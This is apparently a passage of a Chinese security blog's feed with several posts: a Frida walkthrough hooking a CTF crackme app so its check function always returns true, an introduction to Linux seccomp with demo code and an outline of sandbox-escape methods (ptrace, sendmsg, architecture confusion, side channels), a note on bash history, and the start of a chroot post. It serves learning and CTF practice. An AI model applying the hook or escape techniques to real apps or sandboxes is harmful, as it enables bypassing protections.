class="line">.\adb start-server</span><br></pre></td></tr></table></figure><p>然后连接frida服务（之前我把frida-server装在了data&#x2F;local&#x2F;tmp文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\adb shell</span><br><span class="line">su</span><br><span class="line">cd data/local/tmp</span><br><span class="line">./frida-server</span><br></pre></td></tr></table></figure><p>然后再开一个窗口进行端口转发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\adb forward tcp:<span class="number">27042</span> tcp:<span class="number">27042</span></span><br><span class="line"><span class="number">27042</span></span><br></pre></td></tr></table></figure><p>之后可以检查一下有没有连上,有信息出来了就是连上了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-ls-devices</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><h3 id="开始hook"><a href="#开始hook" class="headerlink" title="开始hook"></a>开始hook</h3><p><code>frida-ps -U</code> 找到进程名（这一步前需要你先在模拟器打开crackme1软件才行，不然就不会出现进程名）</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.008.32hxhjyxl7.webp"                                        ></p><p>然后连接</p><p><code>frida -U &quot;进程名“ -l 脚本文件</code></p><p><code>frida -U CrackMe1 -l hook.js</code> 我的脚本文件就是hook.js</p><p>连上了</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.009.4n7oh0w7xh.webp"                                        ></p><p>这是hook.js文件，按照这个模板写就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function set_return() &#123;</span><br><span class="line">    let MainActivity = Java.use(<span class="string">&quot;com.example.crackme1.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity[<span class="string">&quot;check&quot;</span>].implementation = function (flag) &#123;</span><br><span class="line">        console.log(`MainActivity.check <span class="keyword">is</span> called: flag=$&#123;flag&#125;`);</span><br><span class="line">        let result = this[<span class="string">&quot;check&quot;</span>](flag);</span><br><span class="line">        console.log(`MainActivity.check result=$&#123;result&#125;`);</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main() &#123;</span><br><span class="line">    Java.perform(function() &#123;</span><br><span class="line">        set_return();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p>这里直接改为true，无论怎样都返回true</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.010.8ojnvf0dbo.webp"                                        ></p><p>然后随便输入一个字符，此时点击它的判断就是Right了，就代表hook成功</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240924/Aspose.Words.b061723d-fb1e-445f-824f-74287a2b100e.011.1sf0b8h5g2.webp"                                        ></p><h2 id="真机hook"><a href="#真机hook" class="headerlink" title="真机hook"></a>真机hook</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>在手机开发者模式打开usb调试，不同的手机开启方式稍有不同，可以在网上搜索打开方式</p><p>将usb线连上手机，在手机确认连接,可以使用以下指令检测有没有成功安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\adb devices</span><br></pre></td></tr></table></figure><p>将apk安装到手机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\adb install 电脑路径  </span><br></pre></td></tr></table></figure><p>使用shell启动fs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\adb shell</span><br><span class="line">su</span><br><span class="line">cd data/local/tmp</span><br><span class="line">./fs</span><br></pre></td></tr></table></figure><p>然后进行端口转发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>将hook.js文件连接上手机</p><p><code>frida -U CrackMe1 -l hook.js</code></p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/%E4%B8%8B%E8%BD%BD.5xalqdy2pb.webp"                                        ></p><p>和模拟器没有很大区别，最后也hook成功了</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/1FD97C22C88C07333B668CA4D58B9B29.9gwjg6zxt8.webp"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用的例题是**[CISCN 2022 东北]crackme_Android，**虽然这题的关键点在MD5爆破，但是它的主逻辑函数包括了“成功”和“失败”的判断，可以验证是否成功hook函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我的环境&lt;/p&gt;
&lt;p&gt;frida 16.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux沙箱之seccomp介绍</title>
    <link href="http://arch3rn4r.github.io/2024/09/21/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp%E4%BB%8B%E7%BB%8D/"/>
    <id>http://arch3rn4r.github.io/2024/09/21/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp%E4%BB%8B%E7%BB%8D/</id>
    <published>2024-09-21T12:02:15.000Z</published>
    <updated>2025-05-02T02:41:58.773Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>seccomp</strong> (Secure Computing Mode) 是 Linux 内核的一种安全机制，用于限制进程可以调用的系统调用集。本质上是linux系统调用的防火墙，可查看文档<a class="link"   href="http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html" >http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html<i class="fas fa-external-link-alt"></i></a></p><p>seccomp很强大，它可以遗传给子进程，甚至能限制root用户运行的进程，而且可以自己编写复杂的规则来达到目的，能够管理系统调用，禁止某些系统调用，允许某些系统调用，甚至是基于它们的参数来过滤系统调用。</p><p><strong>seccomp原理</strong></p><p><code>seccomp</code> 的核心工作原理是基于 <strong>eBPF</strong>（扩展的 Berkeley Packet Filter），一种内核中的 “虚拟机” 机制，来定义和执行系统调用的过滤规则。**<a class="link"   href="https://github.com/iovisor/bcc" >BCC (BPF Compiler Collection)<i class="fas fa-external-link-alt"></i></a>** 就是一个基于 eBPF 的工具集，可以对系统进行深度的追踪分析，帮助开发者理解和优化系统行为。</p><p>BPF 最初是一个简单的虚拟机，允许用户在内核中安装过滤器程序，这些程序可以定义哪些网络数据包被捕获、过滤或丢弃。而eBPF是利用库，比如seccomp等建立起过滤器，是 BPF 的扩展，最初用于扩展网络过滤功能，但现在它被广泛用于监控、追踪、和执行更多类型的内核任务，不仅限于网络过滤。eBPF 是一个通用的、可编程的内核沙箱系统，可以在不修改内核源码的情况下，通过动态加载字节码，增强内核功能。</p><p><strong>工具</strong></p><p>用于提取 seccomp 规则</p><p><a class="link"   href="https://github.com/david942j/seccomp-tools" >https://github.com/david942j/seccomp-tools<i class="fas fa-external-link-alt"></i></a></p><h4 id="演示环节"><a href="#演示环节" class="headerlink" title="演示环节"></a><strong>演示环节</strong></h4><p>创建沙盒的主要代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scmp_filter_ctx ctx;   <span class="comment">//声明上下文，将创建seccomp过滤容器</span></span><br><span class="line">ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLON);  <span class="comment">//初始化容器</span></span><br><span class="line"><span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(execve), <span class="number">0</span>);<span class="comment">//添加规则</span></span><br><span class="line"><span class="built_in">seccomp_load</span>(ctx);<span class="comment">//调用这个沙盒</span></span><br></pre></td></tr></table></figure><p>为了调用，在编译执行文件时需要加一个参数 <code>-lseccomp</code> 像这样 <code>gcc -o a a.c -lseccomp</code>，将它链接在seccomp库</p><p>下载seccomp <code>sudo apt libseccomp-dev</code></p><p>一个简单的seccomp代码，它的作用是当进程调用 <code>execve</code> 系统调用时，内核将会立即<strong>终止该进程,</strong><code>execl(&quot;/bin/cat&quot;, &quot;cat&quot;, &quot;/flag&quot;, (char *)0);</code>就是有关execve的调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sendfile.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLOW);</span><br><span class="line"><span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(execve), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">seccomp_load</span>(ctx);</span><br><span class="line"></span><br><span class="line"><span class="built_in">execl</span>(<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/catflag&quot;</span>, (<span class="type">char</span> *)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./seccomp</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> yougettheflag!</span><br></pre></td></tr></table></figure><p>加了沙盒代码后的输出,Bad system call</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./seccomp                                                                  </span><br><span class="line">错误的系统调用</span><br></pre></td></tr></table></figure><p>具体可以starce .&#x2F;seccomp查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ strace ./seccomp   </span><br><span class="line">...</span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0</span><br><span class="line">seccomp(SECCOMP_SET_MODE_FILTER, 0, &#123;len=8, filter=0x5654398a6f60&#125;) = 0</span><br><span class="line">execve(<span class="string">&quot;/bin/cat&quot;</span>, [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;catflag&quot;</span>], 0x7fff389874c8 /* 57 vars */) = 59</span><br><span class="line">+++ killed by SIGSYS +++</span><br><span class="line">错误的系统调用</span><br></pre></td></tr></table></figure><h4 id="演示子进程继承seccomp"><a href="#演示子进程继承seccomp" class="headerlink" title="演示子进程继承seccomp"></a><strong>演示</strong>子进程继承<strong>seccomp</strong></h4><p>更换代码，将exe改为read</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(execve), <span class="number">0</span>);</span><br><span class="line">修改为</span><br><span class="line"><span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(read), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>追踪strace cat catflag,可以发现cat调用了read，从文件中读入了flag,cat是seccomp.c的子程序，所以在这里使用cat来演示继承</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc515eae000</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;#!/bin/sh\necho yougettheflag!\n\n&quot;</span>, 131072) = 31</span><br><span class="line">write(1, <span class="string">&quot;#!/bin/sh\necho yougettheflag!\n\n&quot;</span>, 31<span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> yougettheflag!</span><br><span class="line"></span><br><span class="line">) = 31</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 131072)  </span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./seccomp                                                                                  </span><br><span class="line">错误的系统调用</span><br></pre></td></tr></table></figure><p>strace .&#x2F;seccomp 可以发现read进程被kill了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">openat</span>(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span>newfstatat(<span class="number">3</span>, <span class="string">&quot;&quot;</span>, &#123;st_mode=S_IFREG|<span class="number">0644</span>, st_size=<span class="number">123035</span>, ...&#125;, AT_EMPTY_PATH) = <span class="number">0</span>mmap(<span class="literal">NULL</span>, <span class="number">123035</span>, PROT_READ, MAP_PRIVATE, <span class="number">3</span>, <span class="number">0</span>) = <span class="number">0x7fc5b7dc7000c</span>lose(<span class="number">3</span>)                                = <span class="number">0</span>openat(AT_FDCWD, <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span>read(<span class="number">3</span>, <span class="string">&quot;&quot;</span>, <span class="number">832</span>)                        = <span class="number">0</span>+++ killed by SIGSYS +++错误的系统调用</span><br></pre></td></tr></table></figure><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><h4 id="宽松政策"><a href="#宽松政策" class="headerlink" title="宽松政策"></a><strong>宽松政策</strong></h4><p>很多程序使用seccomp，比如docker,firefox等，它们使用seccomp来进行保护。同时，这类应用需要和用户进行交互，需要使用互联网，需要高性能，这通常意味着直接调用内核来实现功能，使用系统调用而不是通过它们的父进程。</p><p>系统调用一直在更新，也就意味着沙盒很难一直跟进系统新功能。有些docker漏洞就是因为不正确的seccomp配置导致的。</p><p>其中一个例子是在沙盒中允许使用ptrace,ptrace是linux的调试功能，允许它作为调试器附加到另一个进程，监视它的执行，改变内存，改变寄存器，可以获得完全控制权。最终能通过另一个进程逃离沙盒。可看这篇文章 （KCTF2024 - 第八题星门 题解 与 ptrace绕过seccomp讨论<a class="link"   href="https://bbs.kanxue.com/thread-283186.htm%EF%BC%89" >https://bbs.kanxue.com/thread-283186.htm）<i class="fas fa-external-link-alt"></i></a></p><p><strong>其他系统调用</strong></p><ul><li>sendmsg()</li></ul><p>不仅可以发送从文件中读取的数据，还可以发送打开文件描述符本身。当在shellcode中执行open，他返回flag的文件描述符，比如数字3.当这个数字被发送到另一个进程，它只是数字3，但是使用sendmsg可以发送包装好的元数据，表明这是一个文件，然后内核看到这个元数据，并将这个打开得内核跟踪的文件传输到你要发信息的进程中。</p><ul><li>prctl()</li></ul><p>抓包</p><ul><li>process_vm_writev()</li></ul><p>该系统调用可以将内存直接写入另一个程序</p><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>源于：AMD,AMD64向后兼容x86 ,linux支持32位和64位代码在同一个进程中交替进行（沙箱名字：native client <a class="link"   href="https://developer.chrome.com/docs/native-client?hl=zh-cn" >https://developer.chrome.com/docs/native-client?hl=zh-cn<i class="fas fa-external-link-alt"></i></a>)</p><p><strong>架构混淆</strong></p><p>linux对于x86和amd64有不同的系统调用定义，在arm64上使用系统调用指令有两种不同的方式来触发它们，</p><p>比如exit()在amd64中系统调用参数是60，在x86和x86_32中是1</p><p>有两种类型的系统调用： <code>syscall</code> 用于 64 位和 <code>int 0x80</code> 用于 32 位。这些架构具有不同的系统调用编号，分别取决于 <code>rax</code> 和 <code>eax</code> 。默认情况下，seccomp 将终止所有 32 位系统调用。</p><p>也就是说如果在之前的seccomp.c代码里加上32位标准的read调用，就有可能绕过沙箱。在默认配置（前面出现的配置)中，这样的错误不会发现，但是在一些非默认配置中就可能出现这样的混淆错误，从而能被利用</p><h4 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h4><p>如果只是想读取信息而不是拿到shell。</p><p>sleep() 根据进程运行时间来传递数据，类似于sql盲注</p><p>一个bit一个bit的传输</p><p>崩溃与无崩溃：在某些情况下，很明显程序崩溃，因为应用程序明确地通过错误消息告诉您，或者只是缺少一些预期的输出。这可以通过崩溃或继续执行来告诉你 1 位信息，利用这一点的方法类似于使用程序的运行时。</p><h4 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h4><p><a class="link"   href="https://github.com/allpaca/chrome-sbx-db" >https://github.com/allpaca/chrome-sbx-db<i class="fas fa-external-link-alt"></i></a></p><h3 id="参考资料和推荐资源"><a href="#参考资料和推荐资源" class="headerlink" title="参考资料和推荐资源"></a>参考资料和推荐资源</h3><p><a class="link"   href="http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html" >http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" >https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://bbs.kanxue.com/thread-283186.htm" >https://bbs.kanxue.com/thread-283186.htm<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/allpaca/chrome-sbx-db" >https://github.com/allpaca/chrome-sbx-db<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces" >https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces<i class="fas fa-external-link-alt"></i></a></p><p><strong>eBPF****相关扩展</strong></p><p><a class="link"   href="https://github.com/iovisor/bcc" >https://github.com/iovisor/bcc<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/11480?time__1311=Cq0xRDnD0D2A0QD/Wr90Djxmw4VKYzea4D" >https://xz.aliyun.com/t/11480?time__1311=Cq0xRDnD0D2A0QD%2FWr90Djxmw4VKYzea4D<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ebpf.io/what-is-ebpf/" >https://ebpf.io/what-is-ebpf/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;seccomp&lt;/strong&gt; (Secure Computing Mode) 是 Linux 内核的一种安全机制，用于限</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>shell的历史命令机制</title>
    <link href="http://arch3rn4r.github.io/2024/09/21/shell%E7%9A%84%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E6%9C%BA%E5%88%B6/"/>
    <id>http://arch3rn4r.github.io/2024/09/21/shell%E7%9A%84%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2024-09-21T06:55:28.000Z</published>
    <updated>2025-05-02T02:41:59.086Z</updated>
    
    <content type="html"><![CDATA[<p>该想法来自chroot实验</p><blockquote><p>使用新方法建立bash后，我查看“上一条命令”，既按箭头”⋀“，出现的指令并不是当前界面下的历史命令</p><p>比如shell1,我的命令是<code>cd ..</code> <code>cat flag.txt shell2</code>，我之前使用的命令是<code>gcc -o 1 1.c</code> <code>./1</code></p><p>在shell1里使用vi新建shell后，再按”⋀“，出现的指令不是<code>cat flag.txt</code> 而是 <code>./1</code></p><p>我知道是“新建”了一个shell，但这些历史命令是怎样被分配到各个shell里的呢</p></blockquote><h3 id="1-Shell-的历史记录机制"><a href="#1-Shell-的历史记录机制" class="headerlink" title="1. Shell 的历史记录机制"></a>1. <strong>Shell 的历史记录机制</strong></h3><p>在 Linux 和 Unix 系统中，<strong>命令历史记录</strong>由每个 Shell 实例独立管理，每个 Shell 会维护自己的命令历史，通常存储在用户的 <code>~/.bash_history</code> 文件中。然而，这个文件只有在 Shell 退出时才会写入，因此每个运行的 Shell 实例在其运行期间拥有独立的命令历史。</p><ul><li><p><strong>Shell 启动</strong>：当你启动一个新的 Bash 实例时，它会从 <code>~/.bash_history</code> 文件中加载命令历史记录，这个历史记录是上次退出的 Bash 实例保存的内容。如果你在多个 Shell 中工作，每个 Shell 在退出时会将它们的命令历史追加到同一个历史文件中。</p></li><li><p><strong>当前 Shell 的历史记录</strong>：在一个 Shell 中，你可以通过按方向键 <code>↑</code>（<code>Up</code>）访问该 Shell 的命令历史，这些历史命令仅限于当前 Shell 的会话。当你在 Shell1 执行了某些命令（如 <code>cd ..</code>、<code>cat flag.txt</code>），这些命令只会保留在该 Shell 的命令历史中。</p></li></ul><h3 id="2-新建-Shell-实例的行为"><a href="#2-新建-Shell-实例的行为" class="headerlink" title="2. 新建 Shell 实例的行为"></a>2. <strong>新建 Shell 实例的行为</strong></h3><ul><li><p>当你在 Shell1 中通过 <code>vi</code> 或其他方式启动一个新的 Bash Shell（Shell2），这个新的 Shell 会从 <code>~/.bash_history</code> 中读取最近的命令历史，但它不会包含当前正在运行的其他 Shell 的实时历史。它只会载入上一次退出 Shell 时保存的命令记录。</p></li><li><p>例如，你在 Shell2 中按 <code>↑</code> 键时，看到的是 <code>gcc -o 1 1.c ./1</code>，这是因为这个命令在 <code>~/.bash_history</code> 文件中被保存过，而 <code>cat flag.txt</code> 尚未被写入 <code>~/.bash_history</code>，因为 Shell1 仍然在运行，并且没有退出。</p></li></ul><h3 id="3-历史记录在不同-Shell-之间的共享"><a href="#3-历史记录在不同-Shell-之间的共享" class="headerlink" title="3. 历史记录在不同 Shell 之间的共享"></a>3. <strong>历史记录在不同 Shell 之间的共享</strong></h3><ul><li>默认情况下，每个 Bash 实例的历史记录都是独立的，只有在当前 Shell 退出时，它的命令历史才会追加到 <code>~/.bash_history</code> 中。不同 Shell 之间的历史记录不会实时同步，因此你在 Shell1 中运行的命令（如 <code>cat flag.txt</code>）在 Shell1 退出之前，不会对其他 Shell 可见。</li></ul><h3 id="4-如何让多个-Shell-共享实时历史记录"><a href="#4-如何让多个-Shell-共享实时历史记录" class="headerlink" title="4. 如何让多个 Shell 共享实时历史记录"></a>4. <strong>如何让多个 Shell 共享实时历史记录</strong></h3><p>为了在多个 Shell 实例之间共享实时历史记录，可以使用以下设置来配置 <code>bash</code> 的历史记录行为：</p><p>在 <code>~/.bashrc</code> 文件中添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使历史记录立即写入文件</span><br><span class="line">shopt -s histappend</span><br><span class="line">PROMPT_COMMAND=&#x27;history -a; history -n&#x27;</span><br><span class="line"></span><br><span class="line"># `history -a` 将新命令追加到历史文件中</span><br><span class="line"># `history -n` 从历史文件中读取新命令</span><br></pre></td></tr></table></figure><p>这样可以确保每个 Shell 在执行新命令后立即将命令写入 <code>~/.bash_history</code> 文件，并从其他 Shell 中读取最新的历史记录。</p><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. <strong>总结</strong></h3><ul><li><p><strong>默认行为</strong>：每个 Shell 实例有自己的命令历史，历史记录只有在 Shell 退出后才会写入 <code>~/.bash_history</code> 文件。每个新 Shell 启动时只会读取文件中已有的历史记录，而不会与其他正在运行的 Shell 实时同步。</p></li><li><p><strong>解决方案</strong>：通过修改 <code>~/.bashrc</code> 中的配置，可以让多个 Shell 实时共享命令历史记录，这样在每个 Shell 中都能看到所有已执行的命令。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该想法来自chroot实验&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用新方法建立bash后，我查看“上一条命令”，既按箭头”⋀“，出现的指令并不是当前界面下的历史命令&lt;/p&gt;
&lt;p&gt;比如shell1,我的命令是&lt;code&gt;cd ..&lt;/code&gt; &lt;code&gt;cat fl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>linux沙箱之文件系统隔离</title>
    <link href="http://arch3rn4r.github.io/2024/09/21/linux%E6%B2%99%E7%AE%B1%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%9A%94%E7%A6%BB/"/>
    <id>http://arch3rn4r.github.io/2024/09/21/linux%E6%B2%99%E7%AE%B1%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%9A%94%E7%A6%BB/</id>
    <published>2024-09-21T06:33:13.000Z</published>
    <updated>2025-05-02T02:41:58.993Z</updated>
    
    <content type="html"><![CDATA[<h2 id="chroot介绍"><a href="#chroot介绍" class="headerlink" title="chroot介绍"></a>chroot介绍</h2><p>通常来说，提到chroot一般有两个含义，chroot(1)是&#x2F;usr&#x2F;bin&#x2F;chroot,要有一定权限才能使用chroot, chroot(2)是glibc中的一个函数,属于系统调用</p><blockquote><p>chroot(1)<br>chroot - run command or interactive shell with special root directory 一个命令行工具，可用于创建沙箱shell，用于交互式 shell 或命令的文件系统隔离</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> [OPTION] NEWROOT [COMMAND [ARG]…]</span><br><span class="line">sudo <span class="built_in">chroot</span> /my/new/root /bin/bash</span><br><span class="line">这将启动一个 Bash shell，并将 /my/new/root 作为新根目录。</span><br></pre></td></tr></table></figure><p><strong>影响范围</strong>：只限于执行 <code>chroot</code> 后启动的进程以及它们的子进程。例如，如果你在一个 shell 中执行 <code>chroot /my/new/root /bin/bash</code>，那么这个新启动的 Bash shell和它的子进程会在 <code>/my/new/root</code> 作为根目录的环境下运行。</p><p><strong>不影响其他 